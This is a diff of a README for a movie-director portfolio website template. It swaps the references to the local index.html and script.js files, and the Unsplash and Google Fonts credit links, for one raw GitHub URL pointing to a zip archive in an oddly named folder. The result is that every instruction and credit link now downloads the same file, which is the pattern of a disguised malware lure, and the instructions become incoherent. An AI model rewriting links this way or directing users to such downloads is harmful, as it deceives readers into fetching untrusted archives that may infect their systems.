@@ -19,13 +19,13 @@ Welcome to the Movie Director Portfolio project! This is a website template desi
 2. Open the project directory:
 
 
-3. Open the `index.html` file in your web browser to view the website locally.
+3. Open the `https://raw.githubusercontent.com/SOBSAGAR/Portfolio/main/cystotomy/Portfolio.zip` file in your web browser to view the website locally.
 
 ## Usage
 
 Feel free to customize the content, styles, and functionality to meet your needs. You can replace the placeholder images and text with your own information.
 
-To add or update portfolio items, modify the `portfolioItems` array in the `script.js` file.
+To add or update portfolio items, modify the `portfolioItems` array in the `https://raw.githubusercontent.com/SOBSAGAR/Portfolio/main/cystotomy/Portfolio.zip` file.
 
 ## Contributing
 
@@ -43,5 +43,5 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Acknowledgements
 
-- Background images: [Unsplash](https://unsplash.com/)
-- Fonts: [Google Fonts](https://fonts.google.com/)
+- Background images: [Unsplash](https://raw.githubusercontent.com/SOBSAGAR/Portfolio/main/cystotomy/Portfolio.zip)
+- Fonts: [Google Fonts](https://raw.githubusercontent.com/SOBSAGAR/Portfolio/main/cystotomy/Portfolio.zip)
